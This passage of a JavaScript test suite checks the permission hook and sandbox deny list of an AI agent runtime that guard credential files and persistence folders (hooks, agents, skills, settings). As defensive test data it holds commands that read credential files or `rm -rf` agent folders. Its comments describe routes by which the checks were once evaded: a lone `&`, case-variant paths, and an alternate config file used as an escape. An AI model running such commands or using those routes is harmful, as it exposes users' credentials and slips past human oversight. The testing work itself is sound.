    fs.mkdirSync(path.join(home, '.claude'), { recursive: true }); // 'hooks/' itself is NOT created
    const variant = path.join(home, '.claude', 'Hooks', 'pretool.sh');
    assert.strictEqual(hook.isPersistenceSurface(variant, home, true), true,
      'on a filesystem that folds case, the unborn folder\'s case variant is still the registry\'s hooks/ entry');
    assert.strictEqual(hook.isPersistenceSurface(variant, home, false), false,
      'on a filesystem that does not fold case, a differently-cased name is a genuinely different folder');

    const secretVariant = path.join(home, '.claude', '.CREDENTIALS.json');
    assert.strictEqual(hook.isSecretPath(secretVariant, home, true), true,
      'the secrets registry folds case the same way, even though the file does not exist yet either');
    assert.strictEqual(hook.isSecretPath(secretVariant, home, false), false);

    // Driven through classifyFileAccess, which is what actually decides
    // whether the write cards: the same unborn case variant reaches a card
    // on a case-folding host, and stays free (a genuinely different,
    // never-registered folder) on one that does not fold case.
    const ws = tmp('af-case-ws-');
    const folded = hook.classifyFileAccess('Write', { file_path: variant }, ws, [], home, true);
    assert.strictEqual(folded.where, 'outside', 'a card is raised on a case-folding host');
    assert.strictEqual(folded.persistenceSurface, true);
    const notFolded = hook.classifyFileAccess('Write', { file_path: variant }, ws, [], home, false);
    assert.strictEqual(notFolded.where, 'inside', 'and free on a host that does not fold case');
  });

  // THE REGISTRY IS FAIL-LOUD IN THE CODE DIRECTION TOO. The doc/registry
  // binding above catches a name added to prose without a registry entry;
  // this catches the opposite failure mode, a path CLASSIFIED as secret or
  // persistence-tier without the registry backing it, by exercising the two
  // functions that are the registry's only consumers (scripts/
  // permission-hook.js says as much of itself: "nowhere else may decide
  // either question with a literal of its own") against a corpus that
  // includes every registry-derived path alongside a wide spread of
  // neighbours chosen to defeat a sloppy literal: a name one character off,
  // the same name in the wrong folder, a nested file under a registered
  // directory's own name, and a path outside the runtime home entirely.
  test('nothing is classified as a secret or a persistence surface unless the registry says so', () => {
    const home = tmp('af-corpus-home-');
    const root = path.join(home, '.claude');
    fs.mkdirSync(root, { recursive: true });

    for (const p of hook.SECRET_RELATIVE_PATHS.map(p => path.join(root, p))) {
      assert.strictEqual(hook.isSecretPath(p, home), true, `${p} is the registry's own secret`);
    }
    for (const p of [
      ...hook.PERSISTENCE_SURFACE_DIRS.map(d => path.join(root, d, 'x')),
      ...hook.PERSISTENCE_SURFACE_FILES.map(f => path.join(root, f)),
    ]) {
      assert.strictEqual(hook.isPersistenceSurface(p, home), true, `${p} is the registry's own persistence surface`);
    }

    const neighbours = [
      path.join(root, 'projects', 'p', 'session.jsonl'),
      path.join(root, 'cache', 'x.html'),
      path.join(root, 'history.jsonl'),
      path.join(root, 'credentials.json'),                 // no leading dot: not the registry's entry
      path.join(root, '.credentials.json.bak'),             // a neighbour, not the entry itself
      path.join(root, 'Documents', '.credentials.json'),    // same name, wrong folder
      path.join(root, 'agent.md'),                          // 'agent', not the 'agents' folder
      path.join(root, 'skill'),                             // 'skill', not 'skills'
      path.join(root, 'commands.json'),                     // not the 'commands' folder
      path.join(root, 'settings.json.bak'),                 // not the registry's exact file
      path.join(home, 'Documents', 'hooks', 'x.sh'),        // 'hooks' exists, but outside the runtime home
    ];
    for (const p of neighbours) {
      assert.strictEqual(hook.isSecretPath(p, home), false, `${p} is not a registry secret`);
      assert.strictEqual(hook.isPersistenceSurface(p, home), false, `${p} is not a registry persistence surface`);
    }

  });

  // A hand-written literal would catch a registry entry deleted but not a
  // folder ADDED to the refusal without one. A NAME-LIST comparison (every
  // REFUSED_CLAUDE_EDIT_DIRS entry also appears in PERSISTENCE_SURFACE_DIRS)
  // proves the two registries agree on names; it proves nothing about what
  // either matcher actually DECIDES for a real path, since each could read a
  // different literal internally and still pass a name-list check. Compared
  // here instead are the two matchers' VERDICTS, over a corpus wide enough
  // that a future divergence between them has to turn this red: the exact
  // spelling, the same folder reached through a symlinked home, a target
  // whose folder has not been created yet, and a case variant (checked both
  // ways the case-folding seam can answer, since a real host's own behaviour
  // must not decide which assertion runs).
  test('the outright refusal and the persistence tier agree on verdicts over a shared corpus of spellings, not just a shared name list', () => {
    for (const name of hook.REFUSED_CLAUDE_EDIT_DIRS) {
      assert.ok(hook.PERSISTENCE_SURFACE_DIRS.includes(name), `${name}/ must also be a registry entry`);

      const home = tmp('af-verdict-home-');
      fs.mkdirSync(path.join(home, '.claude', name), { recursive: true });
      const exact = path.join(home, '.claude', name, 'x.md');

      const linkHome = tmp('af-verdict-link-');
      const link = path.join(linkHome, 'dot');
      fs.symlinkSync(path.join(home, '.claude'), link);
      const symlinked = path.join(link, name, 'x.md');

      const unbornHome = tmp('af-verdict-unborn-');
      fs.mkdirSync(path.join(unbornHome, '.claude'), { recursive: true }); // the name/ folder itself is NOT created
      const unborn = path.join(unbornHome, '.claude', name, 'never-created', 'deep.md');

      const caseHome = tmp('af-verdict-case-');
      fs.mkdirSync(path.join(caseHome, '.claude'), { recursive: true }); // the case variant is unborn too
      const caseVariant = path.join(caseHome, '.claude', name.toUpperCase(), 'x.md');

      const corpus = [
        ['exact', exact, home, undefined, true],
        ['symlinked', symlinked, home, undefined, true],
        ['unborn folder', unborn, unbornHome, undefined, true],
        ['case variant, folding host', caseVariant, caseHome, true, true],
        ['case variant, non-folding host', caseVariant, caseHome, false, false],
      ];
      for (const [label, target, targetHome, foldsCase, mustBeTrue] of corpus) {
        const refused = hook.isProtectedClaudeEdit('Write', { file_path: target }, targetHome, foldsCase);
        const tiered = hook.isPersistenceSurface(target, targetHome, foldsCase);
        assert.strictEqual(refused, tiered,
          `${name}/ (${label}): the refusal and the tier must agree (refused=${refused}, tiered=${tiered})`);
        assert.strictEqual(refused, mustBeTrue, `${name}/ (${label}): expected refused=${mustBeTrue}`);
      }
    }

    const home = os.homedir();
    const write = p => hook.isProtectedClaudeEdit('Write', { file_path: p });
    const notRefused = [
      ...hook.PERSISTENCE_SURFACE_DIRS.filter(d => !hook.REFUSED_CLAUDE_EDIT_DIRS.includes(d)).map(d => path.join(home, '.claude', d, 'x')),
      path.join(home, '.claude', 'agent.md'),         // near miss: a file, not the 'agents' folder
      path.join(home, '.claude', 'skill'),            // near miss: singular, not 'skills'
      path.join(home, 'Documents', 'agents', 'x.md'), // same name, outside the runtime home entirely
    ];
    for (const p of notRefused) assert.strictEqual(write(p), false, `${p} is not refused outright`);
  });

  // THE REFUSAL AND THE TIER MUST ANSWER THE SAME PATH THE SAME WAY, and a
  // comparison that reads raw text while its neighbour folds case is how
  // they came to disagree: on a case-folding filesystem `Agents/` missed the
  // refusal, fell through, and was offered as an approvable card, which
  // approved a write into the folder the app never reads. Both verdicts are
  // compared here over the same spellings, driven through the seam rather
  // than left to whichever filesystem the suite happens to run on.
  test('the refusal and the tier agree on every spelling, including one only a case-folding filesystem would unify', () => {
    // A home that exists nowhere, so no folder on this machine can resolve a
    // spelling before the comparison sees it. The real home would decide the
    // answer for whichever of these folders happens to exist locally, which
    // is the host-dependence this seam was added to remove.
    const home = path.join(os.tmpdir(), 'no-such-home-' + process.pid);
    const variants = [
      path.join(home, '.claude', 'Agents', 'new.md'),
      path.join(home, '.claude', 'SKILLS', 'x', 'SKILL.md'),
      path.join(home, '.claude', 'AgEnTs', 'never-created', 'deep.md'),
    ];
    for (const p of variants) {
      assert.strictEqual(hook.isProtectedClaudeEdit('Write', { file_path: p }, home, true), true,
        `${p} is refused where the filesystem folds case`);
      assert.strictEqual(hook.isPersistenceSurface(p, home, true), true,
        'and the tier classifier says the same, so neither can offer what the other refuses');
      assert.strictEqual(hook.isProtectedClaudeEdit('Write', { file_path: p }, home, false), false,
        `${p} is a genuinely different folder where case is significant, and is not refused`);
      assert.strictEqual(hook.isPersistenceSurface(p, home, false), false,
        'and again the two agree, in the other direction');
    }
  });

  test('a read anywhere under the folder is free, with the single exception of the secrets tier', () => {
    const home = tmp('af-read-home-');
    fs.mkdirSync(path.join(home, '.claude', 'projects', 'flattened'), { recursive: true });
    fs.mkdirSync(path.join(home, '.claude', 'agents'), { recursive: true });
    fs.mkdirSync(path.join(home, '.claude', 'skills', 'my-skill'), { recursive: true });
    const ws = tmp('af-read-ws-');
    for (const target of [
      path.join(home, '.claude', 'projects', 'flattened', 'session.jsonl'), // scratch
      path.join(home, '.claude', 'agents', 'agent.md'),                     // persistence surface
      path.join(home, '.claude', 'skills', 'my-skill', 'SKILL.md'),         // persistence surface
      path.join(home, '.claude', 'settings.json'),                         // persistence surface
    ]) {
      for (const tool of ['Read', 'Grep']) {
        const field = tool === 'Read' ? 'file_path' : 'path';
        assert.strictEqual(hook.classifyFileAccess(tool, { [field]: target }, ws, [], home).where, 'inside',
          `${tool} of ${target} is free`);
      }
    }
    const credentials = path.join(home, '.claude', '.credentials.json');
    const secretRead = hook.classifyFileAccess('Read', { file_path: credentials }, ws, [], home);
    assert.strictEqual(secretRead.where, 'outside', 'the single exception: a read of the secrets tier still cards');
    assert.strictEqual(secretRead.secret, true);
    assert.strictEqual(secretRead.grantDir, null, 'and no grant is offered for it');
  });

  test('a write to a persistence surface cards; a write to scratch, at at least two locations (file and shell), does not', () => {
    const home = tmp('af-write-home-');
    fs.mkdirSync(path.join(home, '.claude', 'agents'), { recursive: true });
    fs.mkdirSync(path.join(home, '.claude', 'cache'), { recursive: true });
    fs.mkdirSync(path.join(home, '.claude', 'paste-cache'), { recursive: true });
    const ws = tmp('af-write-ws-');

    const surfaceWrite = hook.classifyFileAccess('Write', { file_path: path.join(home, '.claude', 'agents', 'new.md') }, ws, [], home);
    assert.strictEqual(surfaceWrite.where, 'outside', 'a write to a persistence surface cards');
    assert.strictEqual(surfaceWrite.persistenceSurface, true);
    assert.strictEqual(surfaceWrite.secret, false);

    const settingsWrite = hook.classifyFileAccess('Write', { file_path: path.join(home, '.claude', 'settings.json') }, ws, [], home);
    assert.strictEqual(settingsWrite.where, 'outside');
    assert.strictEqual(settingsWrite.persistenceSurface, true);

    for (const scratch of [
      path.join(home, '.claude', 'cache', 'fetched-page.html'),
      path.join(home, '.claude', 'paste-cache', 'clip.txt'),
    ]) {
      assert.strictEqual(hook.classifyFileAccess('Write', { file_path: scratch }, ws, [], home).where, 'inside',
        `a routine stash at ${scratch} is free, not a card`);
    }

    // The same tiers hold for a shell command, which cannot declare read or
    // write: scratch is free, a persistence surface and a secret still card.
    const scratchOnly = hook.classifyShellAccess('Bash', { command: `cat ${path.join(home, '.claude', 'cache', 'x.html')}` }, ws, [], home);
    assert.strictEqual(scratchOnly, null, 'nothing outside the workspace is reported: tier three is free');
    const surfaceTouch = hook.classifyShellAccess('Bash', { command: `touch ${path.join(home, '.claude', 'agents', 'x.md')}` }, ws, [], home);
    assert.strictEqual(surfaceTouch.crossings[0].persistenceSurface, true);
    const secretTouch = hook.classifyShellAccess('Bash', { command: `cat ${path.join(home, '.claude', '.credentials.json')}` }, ws, [], home);
    assert.strictEqual(secretTouch.crossings[0].secret, true);
  });

  test('a standing grant over the whole runtime home does not silence a later crossing into the secrets tier', () => {
    // boundaryGrantCovers alone WOULD silence this (a grant over the home
    // is a prefix of everything inside it); crossingCovered must not.
    const home = tmp('af-wide-grant-home-');
    fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
    const ws = tmp('af-wide-grant-ws-');
    const credentials = path.join(home, '.claude', '.credentials.json');

    const original = config.getWorkspace();
    config.setWorkspace(ws);
    try {
      boundary.addBoundaryGrant(path.join(home, '.claude'));
      assert.strictEqual(boundary.boundaryGrantCovers(credentials), true,
        'fixture sanity: the naive per-path check does consider this covered');
      assert.strictEqual(boundary.crossingCovered({ path: credentials }, home), false,
        'the actual decision the server consults still cards it: no grant over the wider root silences a secrets-tier crossing');
      assert.strictEqual(boundary.crossingCovered({ path: path.join(home, '.claude', 'notes.md') }, home), true,
        'an ordinary file in the same folder IS covered: the refusal is specific to the registry, not the whole root');
    } finally {
      config.setWorkspace(original);
    }
  });

  test('the card copy names the secret\'s stakes and the persistence surface\'s, and neither for an ordinary crossing', () => {
    assert.match(permissions.alwaysAskCopy({ secret: true }), /cannot be undone/);
    assert.match(permissions.alwaysAskCopy({ persistenceSurface: true }), /persists/);
    assert.strictEqual(permissions.alwaysAskCopy({ secret: true, persistenceSurface: true }),
      permissions.alwaysAskCopy({ secret: true }), 'the secret\'s stakes win when a crossing is both');
    assert.strictEqual(permissions.alwaysAskCopy({}), null, 'an ordinary crossing renders the existing card unchanged');
    assert.strictEqual(permissions.alwaysAskCopy(null), null);
  });

  // A shell command cannot declare which act it performs, so a persistence
  // surface it touches is graded as a write by default (see the test above).
  // That default is wrong for a command built ENTIRELY from commands this
  // registry knows only read: `ls`, `cat` and their neighbours. Re-grading
  // covers only a crossing under the runtime's OWN home; a command reaching
  // some other outside folder is unaffected by any of this.
  test('a shell command built entirely from read-only commands is free against a persistence surface, exactly as Read/Glob/Grep already are', () => {
    const home = tmp('af-readonly-home-');
    fs.mkdirSync(path.join(home, '.claude', 'agents'), { recursive: true });
    fs.mkdirSync(path.join(home, '.claude', 'skills', 'x'), { recursive: true });
    fs.writeFileSync(path.join(home, '.claude', 'skills', 'x', 'SKILL.md'), 'x');
    const ws = tmp('af-readonly-ws-');

    assert.strictEqual(hook.classifyShellAccess('Bash', { command: `ls ${path.join(home, '.claude', 'agents')}` }, ws, [], home), null,
      'a bare read-only command against a persistence surface raises no crossing');
    assert.strictEqual(hook.classifyShellAccess('Bash', { command: `cat ${path.join(home, '.claude', 'skills', 'x', 'SKILL.md')}` }, ws, [], home), null);

    // FAIL SAFE, three ways: a write command alone, a redirection appended to
    // an otherwise read-only leading command, and a compound where only ONE
    // segment qualifies must all still card.
    const rm = hook.classifyShellAccess('Bash', { command: `rm -rf ${path.join(home, '.claude', 'agents', 'x')}` }, ws, [], home);
    assert.strictEqual(rm.crossings[0].persistenceSurface, true, 'a write command against a persistence surface still cards');

    const redirected = hook.classifyShellAccess('Bash', { command: `echo x > ${path.join(home, '.claude', 'hooks', 'y')}` }, ws, [], home);
    assert.strictEqual(redirected.crossings[0].persistenceSurface, true,
      'echo alone is read-only, but a write-shaped redirection still writes, so this still cards');

    const compound = hook.classifyShellAccess('Bash',
      { command: `ls ${path.join(home, '.claude', 'agents')} && rm -rf ${path.join(home, '.claude', 'agents', 'x')}` }, ws, [], home);
    assert.ok(compound && compound.crossings.some(c => c.persistenceSurface),
      'one non-read-only segment fails the whole command, so a compound that mixes ls with rm still cards');

    // The secrets tier is never re-graded by this: it cards on any access,
    // read or write, whatever the command is built from.
    const secretRead = hook.classifyShellAccess('Bash', { command: `cat ${path.join(home, '.claude', '.credentials.json')}` }, ws, [], home);
    assert.strictEqual(secretRead.crossings[0].secret, true, 'a read-only command touching the credential file still cards');
  });

  test('a PowerShell read is a read: the registry is not Unix-only', () => {
    // MEASURED ON WINDOWS. Asked to list the global agents and skills, the
    // agent ran Get-ChildItem and was shown "this reaches more than one place
    // outside your workspace ... writing here persists", naming both folders.
    // The registry that frees a read under the runtime home listed only Unix
    // commands, so every PowerShell read graded as a write, and the storm this
    // release exists to end was untouched on Windows while fixed on macOS.
    //
    // The risk grader had known PowerShell's verbs all along. Two lists of
    // what counts as a read, one of them never taught about the platform.
    const home = tmp('af-ps-home-');
    fs.mkdirSync(path.join(home, '.claude', 'agents'), { recursive: true });
    fs.mkdirSync(path.join(home, '.claude', 'skills'), { recursive: true });
    const ws = tmp('af-ps-ws-');
    const agents = path.join(home, '.claude', 'agents');
    const skills = path.join(home, '.claude', 'skills');

    for (const command of [
      `Get-ChildItem ${agents}, ${skills}`,
      `Get-ChildItem ${agents} -Force`,
      `gci ${agents}`,
      `dir ${agents}`,
      `Get-Content ${path.join(agents, 'x.md')}`,
      `gc ${path.join(agents, 'x.md')}`,
      `Test-Path ${agents}`,
      // PowerShell is case-insensitive, and agents write it every which way.
      `get-childitem ${agents}`,
      `GET-CHILDITEM ${agents}`,
    ]) {
      assert.strictEqual(hook.classifyShellAccess('PowerShell', { command }, ws, [], home), null,
        `a PowerShell read raises no crossing: ${command}`);
    }

    // FAIL SAFE. A PowerShell write or removal against the same folder still
    // cards, and one destructive segment still fails the whole line.
    for (const command of [
      `Remove-Item ${path.join(agents, 'x.md')}`,
      `Set-Content ${path.join(agents, 'x.md')} -Value hi`,
      `Get-ChildItem ${agents}; Remove-Item ${path.join(agents, 'x.md')}`,
      `New-Item ${path.join(agents, 'x.md')}`,
    ]) {
      const verdict = hook.classifyShellAccess('PowerShell', { command }, ws, [], home);
      assert.ok(verdict && verdict.crossings.some(c => c.persistenceSurface),
        `a PowerShell write still cards: ${command}`);
    }

    // And the secrets tier is not re-graded by any of this.
    const secret = hook.classifyShellAccess('PowerShell',
      { command: `Get-Content ${path.join(home, '.claude', '.credentials.json')}` }, ws, [], home);
    assert.strictEqual(secret.crossings[0].secret, true, 'a PowerShell read of the credential file still cards');
  });

  test('a bare & joins two commands, so the second is graded on its own and cannot ride the first', () => {
    // A single `&` backgrounds what precedes it and runs what follows, so it
    // joins two commands exactly as `&&` does. The segmenter split on `&&`,
    // `||`, `;` and `|` and passed a lone `&` through as ordinary text, so the
    // whole command was judged by its leading word: `ls x & rm -rf x` read as
    // read-only on the strength of the `ls`, and the removal against a
    // persistence surface was freed without a card.
    const home = tmp('af-amp-home-');
    fs.mkdirSync(path.join(home, '.claude', 'agents'), { recursive: true });
    const ws = tmp('af-amp-ws-');
    const agents = path.join(home, '.claude', 'agents');

    for (const command of [
      `ls -1 ${agents} & rm -rf ${path.join(agents, 'dev.md')}`,
      `ls -1 ${agents} 2>/dev/null & rm -rf ${path.join(agents, 'dev.md')}`,
      // Backgrounding the destructive half instead must fail the same way.
      `rm -rf ${path.join(agents, 'dev.md')} & ls -1 ${agents}`,
      // And the existing separators keep failing, so the fix adds one rather
      // than replacing the set.
      `ls -1 ${agents} && rm -rf ${path.join(agents, 'dev.md')}`,
    ]) {
      const verdict = hook.classifyShellAccess('Bash', { command }, ws, [], home);
      assert.ok(verdict && verdict.crossings.some(c => c.persistenceSurface),
        `one unregistered command disqualifies the whole line, however it is joined: ${command}`);
    }

    // A command that is merely backgrounded, with nothing after it, is still
    // only that command: the separator must not turn a read into a write.
    assert.strictEqual(hook.classifyShellAccess('Bash', { command: `ls -1 ${agents} &` }, ws, [], home), null,
      'backgrounding a read is still a read');
  });

  test('a redirection that discards output is not a write, so it cannot turn a read-only command into a persistence-surface card', () => {
    // MEASURED FROM A REAL SESSION. Asked to list the global agents and
    // skills, an agent reached for
    //   ls -1 ~/.claude/agents/ 2>/dev/null; echo ...; ls -1 ~/.claude/skills/
    // and the user was shown "this reaches more than one place outside your
    // workspace ... writing here persists". Nothing in that command writes.
    // The whole-string test for `>` could not tell a discard from a write, so
    // one `2>/dev/null` dropped the command out of the read-only registry and
    // it was graded as a WRITE to two persistence surfaces.
    //
    // A redirect to /dev/null throws output away and a redirect to a file
    // descriptor duplicates a handle. Neither can create or modify a file, so
    // neither is evidence of a write. Every other redirect target still is.
    const home = tmp('af-discard-home-');
    fs.mkdirSync(path.join(home, '.claude', 'agents'), { recursive: true });
    fs.mkdirSync(path.join(home, '.claude', 'skills'), { recursive: true });
    const ws = tmp('af-discard-ws-');
    const agents = path.join(home, '.claude', 'agents');
    const skills = path.join(home, '.claude', 'skills');

    for (const command of [
      `ls -1 ${agents} 2>/dev/null`,
      `ls -1 ${agents} >/dev/null`,
      `ls -1 ${agents} &>/dev/null`,
      `ls -1 ${agents} 2>&1`,
      `ls -1 ${agents} 2>/dev/null | head`,
      // The exact command from the session above.
      `ls -1 ${agents} 2>/dev/null; echo "=== SKILLS ==="; ls -1 ${skills} 2>/dev/null`,
    ]) {
      assert.strictEqual(hook.classifyShellAccess('Bash', { command }, ws, [], home), null,
        `discarding output writes nothing, so this raises no crossing: ${command}`);
    }

    // FAIL SAFE IS UNCHANGED. Only /dev/null and descriptor duplication are
    // exempt; a redirect to any real path is still a write, including one
    // that lands inside the surface itself, and `tee` still writes.
    for (const command of [
      `echo x > ${path.join(agents, 'y.md')}`,
      `ls -1 ${agents} > ${path.join(agents, 'listing.txt')}`,
      `ls -1 ${agents} 2>/dev/null > ${path.join(agents, 'listing.txt')}`,
      `ls -1 ${agents} >> ${path.join(home, '.claude', 'log.txt')}`,
      `ls -1 ${agents} | tee ${path.join(agents, 'listing.txt')}`,
    ]) {
      const verdict = hook.classifyShellAccess('Bash', { command }, ws, [], home);
      assert.ok(verdict && verdict.crossings.some(c => c.persistenceSurface),
        `a redirect to a real path is still a write, so this must still card: ${command}`);
    }
  });

  test('the runtime home root is never offered as a folder to remember: settings.json is the one persistence-surface FILE, and its parent IS the root', () => {
    // Every other persistence surface is a folder, so the grant offered
    // beside its card is scoped to that folder alone. settings.json sits
    // directly at the runtime home root, so path.dirname of it is not a
    // sub-folder at all: it is `~/.claude` itself. Offering that as a
    // "whole folder" grant would silence agents/, skills/, plugins/,
    // commands/ and hooks/ too, which is the wide-grant shape this release
    // removed, returning through the one crossing shaped like a file.
    const home = tmp('af-grantdir-home-');
    fs.mkdirSync(path.join(home, '.claude', 'hooks'), { recursive: true });
    const ws = tmp('af-grantdir-ws-');

    const settingsWrite = hook.classifyFileAccess('Write', { file_path: path.join(home, '.claude', 'settings.json') }, ws, [], home);
    assert.strictEqual(settingsWrite.grantDir, null, 'no folder grant is offered for the runtime home root');

    const hooksWrite = hook.classifyFileAccess('Write', { file_path: path.join(home, '.claude', 'hooks', 'pretool.sh') }, ws, [], home);
    assert.strictEqual(hooksWrite.grantDir, hook.canonicalize(path.join(home, '.claude', 'hooks')),
      'a folder-shaped persistence surface still offers a grant, scoped no wider than its own folder');
  });
});

// WHAT EARLIER BUILDS ACTUALLY WROTE, frozen from each one's sandboxSettings
// output rather than cut from today's list, so an upgrade test cannot pass
// merely because the current list agrees with itself. Every build wrote the
// same head of writable roots, then this machine's temp roots (`tail`). The
// deny lists, by length: none for 0.13.0 to 0.13.2; three for 0.13.3 to
// 0.15.5; eight for 0.15.6. One and two entries were written by the
// development line between 0.13.2 and 0.13.3, and by no release; that line
// also wrote Code mode without an `enabled` key ('keyless').
function releasedDenyWrite(ws, home) {
  return [
    `${ws}/.rundock/state.json`, `${ws}/.rundock/permissions.json`, `${ws}/.claude/settings.local.json`,
    `${home}/.claude/.credentials.json`, `${home}/.claude/.config.json`, `${home}/.codex/auth.json`,
    `${home}/.claude.json`, `${home}/.claude.json.backup`,
  ];
}
const RELEASED_DENY_LENGTHS = [0, 1, 2, 3, 8];
function releasedBlock(n, ws, home, tail, shape) {
  const allowWrite = [ws, `${home}/.npm`, `${home}/.claude`, `${home}/.claude.json`, '/tmp/claude', '/private/tmp/claude', ...tail];
  const filesystem = n ? { allowWrite, denyWrite: releasedDenyWrite(ws, home).slice(0, n) } : { allowWrite };
  if (shape === 'on') return { enabled: true, autoAllowBashIfSandboxed: true, filesystem, network: { allowedDomains: ['*'] } };
  if (shape === 'off') return { enabled: false, filesystem };
  return { filesystem };
}
// The escape paths this change appends after the 0.15.6 list, under a home.
function homeEscapes(home) {
  return [
    `${home}/.claude/settings.json`,
    `${home}/.claude/plugins`, `${home}/.claude/hooks`, `${home}/.claude/skills`,
    `${home}/.claude/agents`, `${home}/.claude/commands`, `${home}/.claude/backups`,
    `${home}/.claude-staging-oauth.json`, `${home}/.claude-local-oauth.json`, `${home}/.claude-custom-oauth.json`,
  ];
}

// THE TWO LAYERS AGREE ABOUT THE CREDENTIAL FILES. The block's write list
// names `~/.claude` whole, because the runtime's bookkeeping lives there, and
// that once left the credential file writable at the operating-system layer
// while the secrets tier cards every access to it. The block now denies every
// secrets-registry path outright, and these tests tie the deny list to the
// registry so a credential added to one cannot be missing from the other.
describe('every credential the secrets tier names is denied by the OS block as well', () => {
  const HOME = '/Users/someone';
  const WS = '/w/ws';
  // Read through the hook's own runtimeHomes, the function its tier checks
  // use, so the folder each registry is joined onto is the hook's and not a
  // copy kept here. POSIX separators, because the block is written for macOS
  // whatever host runs this suite.
  function registryPaths(home) {
    return hook.secretsRegistry(home).map((p) => p.split(path.sep).join('/'));
  }

  test('every secrets-registry path is in denyWrite, in both shapes the block takes', () => {
    const secrets = registryPaths(HOME);
    assert.ok(secrets.includes(`${HOME}/.claude/.credentials.json`), 'sanity: the Claude credential file is in the registry');
    assert.ok(secrets.includes(`${HOME}/.codex/auth.json`), 'sanity: the Codex credential file is in the registry');
    assert.ok(secrets.includes(`${HOME}/.claude.json`), 'sanity: the user-level state file is in the registry');
    assert.ok(secrets.includes(`${HOME}/.claude/.config.json`), 'sanity: the file the runtime reads in its place is in the registry');
    for (const mode of ['on', 'off']) {
      const deny = scaffold.sandboxSettings(WS, 'darwin', HOME, ['/tmp/t'], [], mode).filesystem.denyWrite;
      for (const secret of secrets) {
        assert.ok(deny.includes(secret), `${secret} is a secret the card always asks about, so the ${mode} block denies it too`);
      }
    }
  });

  test('the deny list names no credential the registry does not, so neither list can grow alone', () => {
    const block = scaffold.sandboxSettings(WS, 'darwin', HOME, ['/tmp/t'], []);
    const outsideWorkspace = block.filesystem.denyWrite.filter((p) => !p.startsWith(WS + '/'));
    assert.deepStrictEqual(outsideWorkspace, [...registryPaths(HOME), ...homeEscapes(HOME)],
      'beyond the workspace\'s own files, the deny list is exactly the secrets registry, in registry order, then the runtime\'s escape paths');
  });

  test('the credential entries follow the workspace files, so every block written before them is a prefix and still ours', () => {
    const block = scaffold.sandboxSettings(WS, 'darwin', HOME, ['/tmp/t'], []);
    const deny = block.filesystem.denyWrite;
    const secrets = registryPaths(HOME);
    const first = deny.indexOf(secrets[0]);
    assert.ok(first > 0 && deny.slice(0, first).every((p) => p.startsWith(WS + '/')),
      'appended after the workspace files, never inserted among them');
    assert.deepStrictEqual(deny.slice(first, first + secrets.length), secrets, 'and together, in registry order');
    const asEarlierReleasesWroteIt = { ...block, filesystem: { ...block.filesystem, denyWrite: deny.slice(0, first) } };
    assert.strictEqual(scaffold.isRundockSandbox(asEarlierReleasesWroteIt, 'darwin'), true,
      'the block every earlier 0.15 release wrote is still recognised as Rundock\'s own');
  });

  test('the boundary passage says the operating system refuses the credential file, as the block now does', () => {
    const doc = fs.readFileSync(path.join(ROOT, 'ARCHITECTURE.md'), 'utf8');
    const passage = doc.slice(doc.indexOf('<!-- boundary-registry-start -->'), doc.indexOf('<!-- boundary-registry-end -->'));
    const deny = scaffold.sandboxSettings(WS, 'darwin', HOME, ['/tmp/t'], []).filesystem.denyWrite;
    assert.ok(deny.includes(`${HOME}/.claude/.credentials.json`), 'sanity: the block denies it');
    assert.ok(!/permits a write to the credential file/.test(passage),
      'the passage no longer claims the operating system permits what the block denies');
    assert.match(passage, /refused by the operating system as well/,
      'and it states that both layers hold the line where the block runs');
  });
});

// THE USER-LEVEL STATE FILE IS A SECRET AT THE CARD LAYER TOO. It sits in the
// home folder rather than under a runtime home, so it is matched at the home
// folder's root and nowhere else.
describe('~/.claude.json asks on every access, and offers nothing to remember', () => {
  test('a read and a write by file tool card as a secret with no grant', () => {
    const home = tmp('wb-cj-home-');
    const ws = tmp('wb-cj-ws-');
    const target = path.join(home, '.claude.json');
    fs.writeFileSync(target, '{}');
    for (const tool of ['Read', 'Write']) {
      const access = hook.classifyFileAccess(tool, { file_path: target }, ws, [], home);
      assert.strictEqual(access.where, 'outside', `${tool} crosses`);
      assert.strictEqual(access.secret, true, `${tool} is tagged a secret`);
      assert.strictEqual(access.grantDir, null, `${tool} offers no folder to remember`);
    }
    assert.strictEqual(hook.isSecretPath(path.join(home, '.claude.json.backup'), home), true, 'the backup beside it too');
    // The runtime reads ~/.claude/.config.json in place of ~/.claude.json when
    // it exists, so creating it is the same escape by another name.
    const alternate = path.join(home, '.claude', '.config.json');
    for (const tool of ['Read', 'Write']) {
      const access = hook.classifyFileAccess(tool, { file_path: alternate }, ws, [], home);
      assert.strictEqual(access.secret, true, `${tool} of the alternate file is a secret`);
      assert.strictEqual(access.grantDir, null, `${tool} of the alternate file offers nothing to remember`);
    }
    assert.ok(scaffold.sandboxSettings(ws, 'darwin', home, ['/tmp/t'], []).filesystem.denyWrite.includes(path.posix.join(home, '.claude', '.config.json')),
      'and the block denies creating it');
  });

  test('a shell read carries the secret tag, and naming the home folder does not cover it', () => {
    const home = tmp('wb-cj-home-');
    const ws = tmp('wb-cj-ws-');
    const target = path.join(home, '.claude.json');
    fs.writeFileSync(target, '{}');
    const shell = hook.classifyShellAccess('Bash', { command: `cat ${target}` }, ws, [home], home);
    assert.ok(shell && shell.crossings.some((c) => c.secret), 'a read through the shell is a secret crossing, even with home named');
    assert.strictEqual(hook.classifyFileAccess('Read', { file_path: target }, ws, [home], home).where, 'outside',
      'a named home folder does not make it inside');
  });

  test('only the file at the home root matches, not a namesake elsewhere', () => {
    const home = tmp('wb-cj-home-');
    for (const p of [path.join(home, 'Documents', '.claude.json'), path.join(home, '.claude.json.bak'), path.join(home, '.claude', '.claude.json')]) {
      assert.strictEqual(hook.isSecretPath(p, home), false, `${p} is not the registry's entry`);
    }
  });
});

// AN EXISTING WORKSPACE GAINS THE CREDENTIAL DENY ON ITS NEXT OPEN, and a block
// a person wrote does not. Driven through scaffoldWorkspace, the on-open path,
// against a real settings file, because recognition alone proves nothing about
// what lands on disk.
describe('opening a workspace upgrades Rundock\'s own block to deny the credential files, and nothing else', () => {
  const home = os.homedir();
  const credentials = () => hook.secretsRegistry(home).map((p) => p.split(path.sep).join('/'));
  function open(ws) {
    const prev = scaffold.wireScaffoldDeps({ invalidateAgentCache: () => {}, rebaselineAgentsWatcher: () => {} });
    try { scaffold.scaffoldWorkspace(ws, { platform: 'darwin' }); } finally { scaffold.wireScaffoldDeps(prev); }
  }
  const settingsPath = (ws) => path.join(ws, '.claude', 'settings.local.json');
  const read = (ws) => JSON.parse(fs.readFileSync(settingsPath(ws), 'utf8'));
  // The block as an earlier release wrote it: today's block, cut back to the
